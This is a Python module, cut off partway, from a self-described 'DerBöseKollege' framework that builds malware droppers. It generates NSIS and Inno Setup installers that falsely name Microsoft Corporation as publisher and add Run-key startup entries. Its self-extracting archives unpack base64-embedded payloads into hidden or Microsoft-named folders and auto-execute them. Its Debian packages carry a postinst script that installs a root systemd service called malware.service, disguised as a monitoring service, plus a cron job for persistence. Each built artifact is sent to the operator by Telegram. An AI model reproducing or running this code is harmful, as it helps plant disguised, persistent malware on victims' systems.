#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
installer.py - Installer creation module for deployment packages
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import zipfile
import tarfile
import io
import struct
from typing import Dict, List, Optional, Tuple, Any, Union
from pathlib import Path
from datetime import datetime

# Import logger
from ..utils.logger import get_logger

logger = get_logger()

class InstallerCreator:
    """Creates installers for deployment packages"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Output directories
        self.installers_dir = self.config.get('installers_dir', 'installers')
        self.temp_dir = self.config.get('temp_dir', tempfile.gettempdir())
        
        # Create directories
        os.makedirs(self.installers_dir, exist_ok=True)
        
        logger.info("Installer creator initialized", module="installer")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('installer_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.installer_chat_id = chat_id
                logger.info("Telegram installer bot initialized", module="installer")
            except ImportError:
                logger.warning("Telegram module not available", module="installer")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="installer")
    
    def send_telegram_notification(self, title: str, message: str,
                                 file_path: str = None):
        """Send installer notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'installer_chat_id'):
            return
        
        try:
            full_message = fb>📦 {b>\n\n{message}"
            
            if file_path and os.path.exists(file_path):
                file_size = os.path.getsize(file_path)
                
                # Check file size (Telegram has 50MB limit)
                if file_size50 * 1024 * 1024:  # 50 MB
                    with open(file_path, 'rb') as f:
                        self.telegram_bot.send_document(
                            chat_id=self.installer_chat_id,
                            document=f,
                            caption=full_message,
                            parse_mode='HTML'
                        )
                    logger.debug(f"Installer sent via Telegram: {file_path} ({file_size} bytes)", module="installer")
                else:
                    self.telegram_bot.send_message(
                        chat_id=self.installer_chat_id,
                        text=full_message + f"\n\nFile too large for Telegram: {file_size/(1024*1024):.1f} MB",
                        parse_mode='HTML'
                    )
            else:
                self.telegram_bot.send_message(
                    chat_id=self.installer_chat_id,
                    text=full_message,
                    parse_mode='HTML'
                )
                
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="installer")
    
    def create_nsis_installer(self, files: List[str], output_name: str = None,
                             installer_config: Dict[str, Any] = None) -> Optional[str]:
        """Create NSIS installer for Windows"""
        try:
            if not files:
                logger.error("No files provided for installer", module="installer")
                return None
            
            # Check if NSIS is available
            nsis_paths = [
                'makensis',
                'makensis.exe',
                os.path.join(os.environ.get('PROGRAMFILES', ''), 'NSIS', 'makensis.exe'),
                os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'NSIS', 'makensis.exe')
            ]
            
            nsis_found = False
            nsis_cmd = None
            
            for path in nsis_paths:
                try:
                    result = subprocess.run(
                        [path, '/VERSION'],
                        capture_output=True,
                        text=True
                    )
                    if result.returncode == 0:
                        nsis_found = True
                        nsis_cmd = path
                        break
                except:
                    continue
            
            if not nsis_found:
                logger.warning("NSIS not found, creating installer script only", module="installer")
            
            # Default configuration
            config = installer_config or {}
            
            installer_name = config.get('name', 'Application Installer')
            installer_version = config.get('version', '1.0.0')
            company_name = config.get('company', 'Microsoft Corporation')
            
            install_dir_defaults = {
                'windows': '$PROGRAMFILES\\' + installer_name.replace(' ', ''),
                'linux': '/opt/' + installer_name.lower().replace(' ', '-'),
                'macos': '/Applications/' + installer_name.replace(' ', '')
            }
            
            install_dir = config.get('install_dir', install_dir_defaults['windows'])
            
            # Generate output name if not provided
            if output_name is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_name = f"{installer_name.replace(' ', '_')}_{timestamp}"
            
            output_path = os.path.join(self.installers_dir, f"{output_name}.exe")
            
            # Create temporary directory for installer files
            with tempfile.TemporaryDirectory() as tmp_dir:
                # Copy files to temporary directory
                install_files_dir = os.path.join(tmp_dir, 'files')
                os.makedirs(install_files_dir, exist_ok=True)
                
                for file_spec in files:
                    if isinstance(file_spec, str):
                        src_file = file_spec
                        dst_file = os.path.basename(src_file)
                    elif isinstance(file_spec, dict):
                        src_file = file_spec.get('src')
                        dst_file = file_spec.get('dst', os.path.basename(src_file))
                    
                    if src_file and os.path.exists(src_file):
                        dst_path = os.path.join(install_files_dir, dst_file)
                        shutil.copy2(src_file, dst_path)
                
                # Create NSIS script
                nsis_script_content = f"""
; NSIS Installer Script for {installer_name}
; Generated by DerBöseKollege Framework

Unicode True

; Include Modern UI
!include "MUI2.nsh"

; General Settings
Name "{installer_name}"
OutFile "{output_path}"
InstallDir "{install_dir}"
RequestExecutionLevel admin

; Interface Settings
!define MUI_ABORTWARNING

; Pages
!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_LICENSE "${{NSISDIR}}\\Docs\\Modern UI\\License.nsh"
!insertmacro MUI_PAGE_COMPONENTS
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_INSTFILES

!define MUI_FINISHPAGE_RUN "$INSTDIR\\{os.path.basename(files[0] if isinstance(files[0], str) else files[0].get('src'))}"
!define MUI_FINISHPAGE_SHOWREADME "$INSTDIR\\README.txt"
!insertmacro MUI_PAGE_FINISH

; Languages
!insertmacro MUI_LANGUAGE "English"

; Installation Sections

Section "Main Application" SecMain

  SetOutPath "$INSTDIR"
  
  ; Copy files from temporary directory
  
"""
                
                # Add file copy commands for each file
                for root, dirs, filenames in os.walk(install_files_dir):
                    for filename in filenames:
                        rel_path = os.path.relpath(os.path.join(root, filename), install_files_dir)
                        nsis_script_content += f'  File "{os.path.join(install_files_dir, rel_path).replace(os.sep, "/")}"\n'
                
                nsis_script_content += """
  
  ; Create shortcuts
  
"""
                
                # Create shortcuts for executables
                executables = [f for f in os.listdir(install_files_dir) 
                             if f.endswith(('.exe', '.bat', '.cmd'))]
                
                for exe in executables[:3]:  # Limit to 3 shortcuts
                    nsis_script_content += f"""
  CreateShortCut "$SMPROGRAMS\\{installer_name}\\{os.path.splitext(exe)[0]}.lnk" "$INSTDIR\\{exe}"
"""
                
                nsis_script_content += """
  
  ; Write installation info
  
"""
                
                # Create README file content
                readme_content = f"""{installer_name} - Version {installer_version}

Installation Information:
- Installed to: $INSTDIR$
- Install date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Company: {company_name}

This software is provided as-is without warranty.
"""
                
                readme_file = os.path.join(install_files_dir, 'README.txt')
                with open(readme_file, 'w') as f:
                    f.write(readme_content.replace('$INSTDIR$', install_dir))
                
                nsis_script_content += f"""
  File "{readme_file}"
  
  ; Write registry entries
  
"""
                
                # Add registry entries for persistence and uninstallation info
                nsis_script_content += f"""
  WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}" \
                   "DisplayName" "{installer_name}"
  WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}" \
                   "UninstallString" "$INSTDIR\\uninstall.exe"
  WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}" \
                   "DisplayVersion" "{installer_version}"
  WriteRegStr HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}" \
                   "Publisher" "{company_name}"
  
  ; Create uninstaller
  
"""
                
                nsis_script_content += """
SectionEnd

Section "Start Menu Shortcuts" SecShortcuts

"""
                
                for exe in executables[:3]:
                    nsis_script_content += f"""
  CreateShortCut "$SMPROGRAMS\\{installer_name}\\{os.path.splitext(exe)[0]}.lnk" "$INSTDIR\\{exe}"
"""
                
                nsis_script_content += """
SectionEnd

Section "Desktop Shortcut" SecDesktop

"""
                
                if executables:
                    main_exe = executables[0]
                    nsis_script_content += f"""
  CreateShortCut "$DESKTOP\\{installer_name}.lnk" "$INSTDIR\\{main_exe}"
"""
                
                nsis_script_content += """
SectionEnd

Section "Startup Entry" SecStartup

"""
                
                # Add to startup if configured
                if config.get('add_to_startup', False) and executables:
                    main_exe = executables[0]
                    nsis_script_content += f"""
  WriteRegStr HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\Run" \
                   "{installer_name}" "$INSTDIR\\{main_exe}"
"""
                
                nsis_script_content += """
SectionEnd

; Uninstaller Section

Section "Uninstall"

  ; Remove files
  
"""
                
                for root, dirs, filenames in os.walk(install_files_dir):
                    for filename in filenames:
                        nsis_script_content += f'  Delete "$INSTDIR\\{filename}"\n'
                
                nsis_script_content += """
  
  ; Remove shortcuts
  
"""
                
                for exe in executables[:3]:
                    nsis_script_content += f"""
  Delete "$SMPROGRAMS\\{installer_name}\\{os.path.splitext(exe)[0]}.lnk"
"""
                
                nsis_script_content += """
  
  ; Remove desktop shortcut
  
"""
                
                if executables:
                    nsis_script_content += f"""
  Delete "$DESKTOP\\{installer_name}.lnk"
"""
                
                nsis_script_content += """
  
  ; Remove startup entry
  
"""
                
                if config.get('add_to_startup', False):
                    nsis_script_content += f"""
  DeleteRegValue HKCU "Software\\Microsoft\\Windows\\CurrentVersion\\Run" "{installer_name}"
"""
                
                nsis_script_content += """
  
  ; Remove registry entries
  
"""
                
                nsis_script_content += f"""
  DeleteRegKey HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}"
  
  ; Remove directories
  
  RMDir "$SMPROGRAMS\\{installer_name}"
  RMDir "$INSTDIR"

SectionEnd

; Section Descriptions

LangString DESC_SecMain ${{LANG_ENGLISH}} "Main application files."
LangString DESC_SecShortcuts ${{LANG_ENGLISH}} "Create Start Menu shortcuts."
LangString DESC_SecDesktop ${{LANG_ENGLISH}} "Create desktop shortcut."
LangString DESC_SecStartup ${{LANG_ENGLISH}} "Add to Windows startup."

!insertmacro MUI_FUNCTION_DESCRIPTION_BEGIN
  !insertmacro MUI_DESCRIPTION_TEXT ${{SecMain}} ${{DESC_SecMain}}
  !insertmacro MUI_DESCRIPTION_TEXT ${{SecShortcuts}} ${{DESC_SecShortcuts}}
  !insertmacro MUI_DESCRIPTION_TEXT ${{SecDesktop}} ${{DESC_SecDesktop}}
  !insertmacro MUI_DESCRIPTION_TEXT ${{SecStartup}} ${{DESC_SecStartup}}
!insertmacro MUI_FUNCTION_DESCRIPTION_END

; Functions

Function .onInit
  
  ; Check for previous installation
  
"""
                
                nsis_script_content += f"""
  ReadRegStr $R0 HKLM "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{installer_name}" "UninstallString"
  StrCmp $R0 "" done
  
  MessageBox MB_OKCANCEL|MB_ICONEXCLAMATION \
    "{installer_name} is already installed. $\n$\nClick OK to remove the previous version or Cancel to cancel this installation." \
    IDOK uninst
  
  Abort
  
  uninst:
    ClearErrors
    
"""
                
                nsis_script_content += """
    ExecWait '$R0 _?=$INSTDIR'
    
    IfErrors no_remove_uninstaller done
    
    no_remove_uninstaller:
  
  done:

FunctionEnd

Function .onInstSuccess
  
  ; Installation successful message
  
"""
                
                nsis_script_content += f"""
  MessageBox MB_OK|MB_ICONINFORMATION \
    "{installer_name} has been successfully installed. $\n$\nThe application will start automatically."

FunctionEnd

Function .onInstFailed
  
  ; Installation failed message
  
"""
                
                nsis_script_content += f"""
  MessageBox MB_OK|MB_ICONSTOP \
    "{installer_name} installation failed. $\n$\nPlease check your system requirements and try again."

FunctionEnd

; End of Script

"""
                
                # Save NSIS script to temporary file
                nsis_script_file = os.path.join(tmp_dir, 'installer.nsi')
                with open(nsis_script_file, 'w', encoding='utf-8') as f:
                    f.write(nsis_script_content)
                
                # Compile with NSIS if available
                if nsis_found and nsis_cmd:
                    logger.info(f"Compiling NSIS installer: {output_name}", module="installer")
                    
                    cmd = [nsis_cmd, nsis_script_file]
                    
                    try:
                        result = subprocess.run(
                            cmd,
                            capture_output=True,
                            text=True,
                            cwd=tmp_dir,
                            timeout=300  # 5 minutes timeout
                        )
                        
                        if result.returncode != 0:
                            logger.error(f"NSIS compilation failed: {result.stderr}", module="installer")
                            
                            # Create placeholder installer script instead
                            placeholder_msg = f"; NSIS Installer Script (Compilation Failed)\n; Error: {result.stderr[:200]}\n"
                            with open(output_path.replace('.exe', '.nsi'), 'w') as f:
                                f.write(nsis_script_content)
                            
                            output_path = output_path.replace('.exe', '.nsi')
                        
                        else:
                            logger.info(f"NSIS compilation successful", module="installer")
                            
                            # Move compiled installer to output directory if it's elsewhere
                            compiled_installer = os.path.join(tmp_dir, os.path.basename(output_path))
                            if os.path.exists(compiled_installer):
                                shutil.move(compiled_installer, output_path)
                    
                    except Exception as e:
                        logger.error(f"NSIS compilation error: {e}", module="installer")
                        
                        # Save NSIS script as fallback
                        with open(output_path.replace('.exe', '.nsi'), 'w') as f:
                            f.write(nsis_script_content)
                        
                        output_path = output_path.replace('.exe', '.nsi')
                
                else:
                    # NSIS not found, save script only
                    logger.warning("NSIS not found, saving installer script only", module="installer")
                    
                    with open(output_path.replace('.exe', '.nsi'), 'w') as f:
                        f.write(nsis_script_content)
                    
                    output_path = output_path.replace('.exe', '.nsi')
            
            # Calculate installer size and hash
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            
            installer_hash = ''
            if os.path.exists(output_path):
                with open(output_path, 'rb') as f:
                    installer_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Send Telegram notification
            self.send_telegram_notification(
                "NSIS Installer Created",
                f"Installer: {os.path.basename(output_path)}\n"
                f"Size: {file_size/(1024*1024):.2f} MB\n"
                f"Hash: {installer_hash[:16] if installer_hash else 'N/A'}...\n"
                f"Files included: {len(files)}\n"
                f"NSIS used: {nsis_found}",
                output_path if os.path.exists(output_path) else None
            )
            
            logger.info(f"Installer created: {output_path} ({file_size} bytes)", module="installer")
            return output_path
            
        except Exception as e:
            logger.error(f"NSIS installer creation error: {e}", module="installer")
            return None
    
    def create_inno_setup_installer(self, files: List[str], output_name: str = None,
                                   installer_config: Dict[str, Any] = None) -> Optional[str]:
        """Create Inno Setup installer for Windows"""
        try:
            if not files:
                logger.error("No files provided for installer", module="installer")
                return None
            
            # Check if Inno Setup is available (optional)
            
            # Default configuration
            config = installer_config or {}
            
            installer_name = config.get('name', 'Application Installer')
            
            # Generate output name if not provided
            if output_name is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_name = f"{installer_name.replace(' ', '_')}_{timestamp}"
            
            output_path = os.path.join(self.installers_dir, f"{output_name}_inno.exe")
            
            # Create Inno Setup script (simplified version)
            inno_script_content = f"""; Inno Setup Script for {installer_name}
; Generated by DerBöseKollege Framework

#define MyAppName "{installer_name}"
#define MyAppVersion "{config.get('version', '1.0.0')}"
#define MyAppPublisher "{config.get('company', 'Microsoft Corporation')}"
#define MyAppURL "http://www.example.com/"
#define MyAppExeName "{os.path.basename(files[0] if isinstance(files[0], str) else files[0].get('src'))}"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
AppId={{{{__uuid}}}}
AppName={{#MyAppName}}
AppVersion={{#MyAppVersion}}
AppVerName={{#MyAppName}} {{#MyAppVersion}}
AppPublisher={{#MyAppPublisher}}
AppPublisherURL={{#MyAppURL}}
AppSupportURL={{#MyAppURL}}
AppUpdatesURL={{#MyAppURL}}
DefaultDirName={{autopf}}\{{#MyAppName}}
DefaultGroupName={{#MyAppName}}
AllowNoIcons=yes

; Uncomment the following line to run in non administrative install mode (install for current user only.)
;PrivilegesRequired=lowest

OutputDir={os.path.dirname(output_path)}
OutputBaseFilename={output_name}
Compression=lzma2/ultra64
SolidCompression=yes

; Wizard Images and Icons

WizardImageFile=compiler:wizmodernimage-is.bmp

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{{cm:CreateDesktopIcon}}"; GroupDescription: "{{cm:AdditionalIcons}}"; Flags: unchecked

[Files]

"""
            
            # Add files section (simplified - would need actual file copying in real implementation)
            for i, file_spec in enumerate(files):
                if isinstance(file_spec, str):
                    src_file = file_spec
                    dst_file = os.path.basename(src_file)
                elif isinstance(file_spec, dict):
                    src_file = file_spec.get('src')
                    dst_file = file_spec.get('dst', os.path.basename(src_file))
                
                inno_script_content += f'Source: "{src_file}"; DestDir: "{{app}}"; Flags: ignoreversion\n'
            
            inno_script_content += """

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{group}\{{cm:UninstallProgram},{#MyAppName}}"; Filename: "{uninstallexe}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{{cm:LaunchProgram,{{#StringChange(MyAppName, '&', '&&')}}}}"; Flags: nowait postinstall skipifsilent

[Code]

// Custom code section for additional functionality

function InitializeSetup(): Boolean;
begin
  // Check for previous installation or system requirements
  
  Result := True;
end;

procedure CurStepChanged(CurStep: TSetupStep);
begin
  // Additional steps during installation
  
  if CurStep = ssPostInstall then begin
    
"""
            
            # Add startup entry if configured
            if config.get('add_to_startup', False):
                inno_script_content += """
    // Add to startup
    
    RegWriteStringValue(
      HKEY_CURRENT_USER,
      'Software\Microsoft\Windows\CurrentVersion\Run',
      '{#MyAppName}',
      ExpandConstant('{app}\{#MyAppExeName}')
    );
    
"""
            
            inno_script_content += """
    
  end;
end;

function InitializeUninstall(): Boolean;
begin
  
"""
            
            inno_script_content += """
  
  Result := True;
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
begin
  
"""
            
            inno_script_content += """
  
end;

"""
            
            # Save Inno Setup script to file (can't compile without Inno Setup compiler)
            script_output_path = output_path.replace('.exe', '.iss')
            
            with open(script_output_path, 'w', encoding='utf-8') as f:
                f.write(inno_script_content.replace('{{__uuid}}', 
                                                   hashlib.md5(installer_name.encode()).hexdigest()))
            
            logger.info(f"Inno Setup script created (requires compilation): {script_output_path}", module="installer")
            
            return script_output_path
            
        except Exception as e:
            logger.error(f"Inno Setup installer creation error: {e}", module="installer")
            return None
    
    def create_self_extracting_archive(self, files: List[str], output_name: str = None,
                                      extract_to: str = None, auto_execute: str = None,
                                      password: str = None) -> Optional[str]:
        """Create self-extracting archive"""
        try:
            if not files:
                logger.error("No files provided for archive", module="installer")
                return None
            
            # Generate output name if not provided
            if output_name is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_name = f'self_extracting_{timestamp}'
            
            output_extensions = {
                'windows': '.exe',
                'linux': '.bin',
                'darwin': '.app'
            }
            
            extension = output_extensions.get(sys.platform, '.bin')
            output_path = os.path.join(self.installers_dir, f"{output_name}{extension}")
            
            with tempfile.TemporaryDirectory() as tmp_dir:
                archive_dir = os.path.join(tmp_dir, 'archive')
                os.makedirs(archive_dir, exist_ok=True)
                
                # Copy files to archive directory
                for file_spec in files:
                    if isinstance(file_spec, str):
                        src_file = file_spec
                        dst_file = os.path.basename(src_file)
                    elif isinstance(file_spec, dict):
                        src_file = file_spec.get('src')
                        dst_file = file_spec.get('dst', os.path.basename(src_file))
                    
                    if src_file and os.path.exists(src_file):
                        dst_path = os.path.join(archive_dir, dst_file)
                        shutil.copy2(src_file, dst_path)
                
                # Create extraction script based on platform
                extract_to_dir = extract_to or '$TEMP/$RANDOM'
                
                if sys.platform == 'win32':
                    sfx_content = self._create_windows_sfx(archive_dir, extract_to_dir, auto_execute, password)
                    
                    with open(output_path, 'wb') as f:
                        f.write(sfx_content)
                
                elif sys.platform in ['linux', 'darwin']:
                    sfx_content = self._create_unix_sfx(archive_dir, extract_to_dir, auto_execute, password)
                    
                    with open(output_path, 'wb') as f:
                        f.write(sfx_content)
                    
                    os.chmod(output_path, 0o755)
                
                else:
                    logger.error(f"Unsupported platform for SFX: {sys.platform}", module="installer")
                    
                    # Fall back to regular zip file
                    zip_path = output_path.replace(extension, '.zip')
                    
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, filenames in os.walk(archive_dir):
                            for filename in filenames:
                                filepath = os.path.join(root, filename)
                                arcname = os.path.relpath(filepath, archive_dir)
                                zipf.write(filepath, arcname)
                    
                    output_path = zip_path
            
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            
            self.send_telegram_notification(
                "Self-Extracting Archive Created",
                f"Archive: {os.path.basename(output_path)}\n"
                f"Size: {file_size/(1024*1024):.2f} MB\n"
                f"Files included: {len(files)}\n"
                f"Extract to: {extract_to or 'Temporary directory'}\n"
                f"Auto-execute: {'Yes' if auto_execute else 'No'}",
                output_path if os.path.exists(output_path) else None
            )
            
            logger.info(f"Self-extracting archive created: {output_path} ({file_size} bytes)", module="installer")
            return output_path
            
        except Exception as e:
            logger.error(f"Self-extracting archive creation error: {e}", module="installer")
            return None
    
    def _create_windows_sfx(self, archive_dir: str, extract_to: str,
                           auto_execute: str, password: str) -> bytes:
        """Create Windows self-extracting executable"""
        
        # Create a simple SFX stub (simplified version)
        
        # Create batch file for extraction
        extract_bat = f"""@echo off
setlocal enabledelayedexpansion

REM Self-extracting archive
REM Generated by DerBöseKollege Framework

echo Extracting files...

REM Create extraction directory
set EXTRACT_DIR={extract_to}
if "%EXTRACT_DIR%"=="$TEMP/$RANDOM" (
    set EXTRACT_DIR=%TEMP%\\!RANDOM!
    md "%EXTRACT_DIR%" 2>nul
) else if "%EXTRACT_DIR%"=="$APPDATA" (
    set EXTRACT_DIR=%APPDATA%\\Microsoft\\Windows
    md "%EXTRACT_DIR%" 2>nul
)

REM Extract files from archive
"""
        
        # Add file extraction commands
        file_index = 0
        for root, dirs, filenames in os.walk(archive_dir):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                relpath = os.path.relpath(filepath, archive_dir)
                
                # Read file and encode as base64 for embedding
                with open(filepath, 'rb') as f:
                    file_data = f.read()
                
                encoded_data = base64.b64encode(file_data).decode('ascii')
                
                # Split into chunks for batch file
                chunk_size = 1000
                chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
                
                extract_bat += f"\nREM File: {relpath}\n"
                extract_bat += f"echo. > \"%EXTRACT_DIR%\\{relpath}.b64\"\n"
                
                for i, chunk in enumerate(chunks):
                    extract_bat += f"echo {chunk} >> \"%EXTRACT_DIR%\\{relpath}.b64\"\n"
                
                extract_bat += f"certutil -decode \"%EXTRACT_DIR%\\{relpath}.b64\" \"%EXTRACT_DIR%\\{relpath}\" >nul 2>&1\n"
                extract_bat += f"del \"%EXTRACT_DIR%\\{relpath}.b64\" >nul 2>&1\n"
                
                file_index += 1
        
        # Add execution command if specified
        if auto_execute:
            extract_bat += f"""
REM Execute main file
echo Starting application...
start "" "%EXTRACT_DIR%\\{auto_execute}"
"""
        
        extract_bat += """
echo Extraction complete!
echo Files extracted to: %EXTRACT_DIR%
pause
"""
        
        # Create final executable by embedding batch file in a stub
        stub_template = b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\t\xCD!\xB8\x01L\xCD!This program cannot be run in DOS mode.\r\r\n$\x00\x00\x00\x00\x00\x00\x00'
        
        # Convert batch file to bytes
        batch_bytes = extract_bat.encode('utf-8')
        
        # Create simple PE stub that writes batch file and executes it
        sfx_content = stub_template + batch_bytes
        
        return sfx_content
    
    def _create_unix_sfx(self, archive_dir: str, extract_to: str,
                        auto_execute: str, password: str) -> bytes:
        """Create Unix self-extracting script"""
        
        # Create shell script for extraction
        extract_sh = f"""#!/bin/bash
# Self-extracting archive
# Generated by DerBöseKollege Framework

echo "Extracting files..."

# Create extraction directory
EXTRACT_DIR="{extract_to}"
if [ "$EXTRACT_DIR" = "\$TEMP/\$RANDOM" ]; then
    EXTRACT_DIR="/tmp/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"
    mkdir -p "$EXTRACT_DIR"
elif [ "$EXTRACT_DIR" = "\$HOME" ]; then
    EXTRACT_DIR="$HOME/.local/share"
    mkdir -p "$EXTRACT_DIR"
fi

# Extract embedded files

"""
        
        # Embed files as base64
        for root, dirs, filenames in os.walk(archive_dir):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                relpath = os.path.relpath(filepath, archive_dir)
                
                # Read file and encode as base64
                with open(filepath, 'rb') as f:
                    file_data = f.read()
                
                encoded_data = base64.b64encode(file_data).decode('ascii')
                
                extract_sh += f"# File: {relpath}\n"
                extract_sh += f"cat > \"$EXTRACT_DIR/{relpath}.b64\" << 'EOF_{relpath.replace('/', '_')}'\n"
                extract_sh += encoded_data + "\n"
                extract_sh += f"EOF_{relpath.replace('/', '_')}\n"
                extract_sh += f"base64 -d \"$EXTRACT_DIR/{relpath}.b64\" > \"$EXTRACT_DIR/{relpath}\"\n"
                extract_sh += f"chmod +x \"$EXTRACT_DIR/{relpath}\" 2>/dev/null\n"
                extract_sh += f"rm -f \"$EXTRACT_DIR/{relpath}.b64\"\n\n"
        
        # Add execution command if specified
        if auto_execute:
            extract_sh += f"""
# Execute main file
echo "Starting application..."
"$EXTRACT_DIR/{auto_execute}" &
"""
        
        extract_sh += """
echo "Extraction complete!"
echo "Files extracted to: $EXTRACT_DIR"

# Keep script running or exit
read -p "Press Enter to exit..." dummy
"""
        
        return extract_sh.encode('utf-8')
    
    def create_deb_package(self, files: List[str], package_name: str = None,
                          package_config: Dict[str, Any] = None) -> Optional[str]:
        """Create Debian package for Linux"""
        try:
            if not files:
                logger.error("No files provided for package", module="installer")
                return None
            
            # Default configuration
            config = package_config or {}
            
            pkg_name = package_name or config.get('name', 'malware-package')
            pkg_version = config.get('version', '1.0.0')
            pkg_maintainer = config.get('maintainer', 'root@localhost')
            pkg_description = config.get('description', 'System package')
            pkg_architecture = config.get('architecture', 'all')
            
            output_path = os.path.join(self.installers_dir, f"{pkg_name}_{pkg_version}_{pkg_architecture}.deb")
            
            with tempfile.TemporaryDirectory() as tmp_dir:
                # Create package structure
                pkg_root = os.path.join(tmp_dir, 'pkg')
                debian_dir = os.path.join(pkg_root, 'DEBIAN')
                install_dir = os.path.join(pkg_root, 'usr', 'local', 'bin')
                
                os.makedirs(debian_dir, exist_ok=True)
                os.makedirs(install_dir, exist_ok=True)
                
                # Copy files to package
                for file_spec in files:
                    if isinstance(file_spec, str):
                        src_file = file_spec
                        dst_file = os.path.basename(src_file)
                    elif isinstance(file_spec, dict):
                        src_file = file_spec.get('src')
                        dst_file = file_spec.get('dst', os.path.basename(src_file))
                    
                    if src_file and os.path.exists(src_file):
                        dst_path = os.path.join(install_dir, dst_file)
                        shutil.copy2(src_file, dst_path)
                        
                        # Make executable if it looks like a binary/script
                        if (dst_file.endswith(('.sh', '.py', '.pl', '.rb')) or 
                            '.' not in dst_file):
                            os.chmod(dst_path, 0o755)
                
                # Create control file
                control_content = f"""Package: {pkg_name}
Version: {pkg_version}
Architecture: {pkg_architecture}
Maintainer: {pkg_maintainer}
Description: {pkg_description}
Priority: optional
Section: utils
"""
                
                control_path = os.path.join(debian_dir, 'control')
                with open(control_path, 'w') as f:
                    f.write(control_content)
                
                # Create postinst script for persistence
                postinst_content = """#!/bin/bash
# Post-installation script

echo "Installing system service..."

# Create systemd service if systemd is available
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/malware.service << EOF
[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/{main_binary}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable malware.service
    systemctl start malware.service
fi

# Add to crontab for backup persistence
(crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/{main_binary} >/dev/null 2>&1") | crontab -

echo "Installation complete!"
"""
                
                # Determine main binary
                main_binary = None
                for file_spec in files:
                    if isinstance(file_spec, dict):
                        src = file_spec.get('src')
                    else:
                        src = file_spec
                    
                    if src and os.path.exists(src):
                        basename = os.path.basename(src)
                        if basename.endswith(('.sh', '.py', '')) or '.' not in basename:
                            main_binary = basename
                            break
                
                if main_binary:
                    postinst_content = postinst_content.format(main_binary=main_binary)
                    
                    postinst_path = os.path.join(debian_dir, 'postinst')
                    with open(postinst_path, 'w') as f:
                        f.write(postinst_content)
                    
                    os.chmod(postinst_path, 0o755)
                
                # Create prerm script for cleanup
                prerm_content = """#!/bin/bash
# Pre-removal script

echo "Removing system service..."

# Stop and disable systemd service
if command -v systemctl >/dev/null 2>&1; then
    systemctl stop malware.service 2>/dev/null
    systemctl disable malware.service 2>/dev/null
    rm -f /etc/systemd/system/malware.service
    systemctl daemon-reload
fi

# Remove from crontab
crontab -l 2>/dev/null | grep -v "/usr/local/bin/" | crontab -

echo "Cleanup complete!"
"""
                
                prerm_path = os.path.join(debian_dir, 'prerm')
                with open(prerm_path, 'w') as f:
                    f.write(prerm_content)
                
                os.chmod(prerm_path, 0o755)
                
                # Build DEB package using dpkg-deb
                try:
                    cmd = ['dpkg-deb', '--build', pkg_root, output_path]
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    
                    if result.returncode != 0:
                        logger.error(f"DEB package creation failed: {result.stderr}", module="installer")
                        
                        # Fallback: Create tar.gz instead
                        tar_path = output_path.replace('.deb', '.tar.gz')
                        with tarfile.open(tar_path, 'w:gz') as tar:
                            tar.add(pkg_root, arcname=os.path.basename(pkg_root))
                        
                        output_path = tar_path
                        logger.info(f"Created tar.gz fallback: {tar_path}", module="installer")
                
                except FileNotFoundError:
